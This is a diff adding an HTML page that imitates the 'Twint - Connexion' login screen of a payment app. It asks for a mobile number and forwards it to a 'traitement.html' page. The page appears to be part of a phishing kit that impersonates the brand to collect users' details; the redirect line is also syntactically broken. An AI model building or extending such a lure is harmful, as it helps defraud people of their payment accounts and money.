@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Twint - Connexion</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { display: flex; justify-content: center; align-items: center; height: 100vh; background: #fff; text-align: center; flex-direction: column; }
+
+        #main-content { width: 100%; max-width: 400px; }
+        img { width: 100px; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { width: 100%; padding: 10px; background: #ccc; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
+        button:disabled { background: #eee; cursor: not-allowed; }
+    </style>
+</head>
+<body>
+
+    <div id="main-content">
+        <img src="photo_2025-03-05_02-45-20.jpg" alt="Phone">
+        <h2>Veuillez saisir votre numéro</h2>
+        <p>Veuillez saisir votre numéro de portable.</p>
+        <input type="tel" id="phone-number" placeholder="p. ex. 079 555 12 34" oninput="validateInput()">
+        <button id="submit-btn" disabled onclick="submitForm()">Suivant</button>
+        <button onclick="history.back()">Retour</button>
+    </div>
+
+    <script>
+        function validateInput() {
+            let phoneInput = document.getElementById("phone-number").value;
+            let button = document.getElementById("submit-btn");
+            let phoneRegex = /^\+?\d{7,15}$/; // رقم هاتف صالح
+            button.disabled = !phoneRegex.test(phoneInput);
+        }
+
+        function submitForm() {
+            let phoneInput = document.getElementById("phone-number").value;
+            window.location.href = traitement.html?phone=${encodeURIComponent(phoneInput)};
+        }
+    </script>
+
+</body>
+</html>
